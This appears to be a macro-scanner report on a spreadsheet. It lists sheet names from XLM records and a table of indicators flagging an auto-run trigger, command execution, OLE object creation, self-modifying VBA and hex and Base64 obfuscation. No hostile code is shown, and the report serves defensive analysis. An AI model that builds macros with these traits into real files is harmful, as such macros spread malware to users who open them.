- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - M e t
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  at komp (11
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  at komp (10
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Biliot (4
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Biliot (3
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Biliot (2
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  at komp (9
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  at komp (8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (21
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  IV ket
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU2003.1
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU2003.1
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU2003.1
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (20
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  at komp (6
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  at komp (7
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Bilio
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (19
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (18
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  III ketv
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU09
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU08
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU07
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  II ket
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU0
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU0
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU0
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU0
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU0
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU0
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (17
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  at komp (5
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  at komp (4
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (16
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (15
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (14
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (13
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (12
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (11
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (10
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  at komp (3
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (9
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  at komp (2
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (8
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (7
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (6
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  at kom
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (5
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (4
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (3
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atost (2
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Atos
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU1
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU1
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU1
' 0085     11 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU
' 0085     11 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU
' 0085     11 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU
' 0085     11 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU
' 0085     11 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU
' 0085     11 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU
' 0085     11 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  DU
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  komppa
' 0085     10 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  T
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

